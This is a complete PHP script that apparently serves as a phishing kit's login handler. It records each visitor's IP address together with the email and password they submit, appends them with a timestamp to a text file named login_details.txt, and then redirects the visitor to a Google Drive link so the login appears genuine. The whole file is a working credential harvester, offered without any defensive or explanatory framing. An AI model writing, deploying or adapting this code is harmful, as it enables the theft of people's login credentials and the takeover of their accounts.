<?php

session_start();
ob_start();

function getIPAddress() {  
    //whether ip is from the share internet  
     if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
                $ip = $_SERVER['HTTP_CLIENT_IP'];  
        }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
     }  
    //whether ip is from the remote address  
    else{  
        $ip = $_SERVER['REMOTE_ADDR'];  
    }  
    return $ip;
}


$ip = getIPAddress();  
// echo 'User Real IP Address - '.$ip;

date_default_timezone_set('Asia/Manila');
$content = $ip."     ".date('m/d/Y h:i:s a', time())."     ".$_POST['email']."     ".$_POST['password']."\n";

$file_handle = fopen('login_details.txt', 'a');
fwrite($file_handle, $content);
fclose($file_handle);

$redirect_url = 'https://drive.google.com/file/d/1cMnZlVOcVV02Usi9P7NRa45gXBh-ABpX/view?usp=sharing';
header("Location: ".$redirect_url);
exit();


?>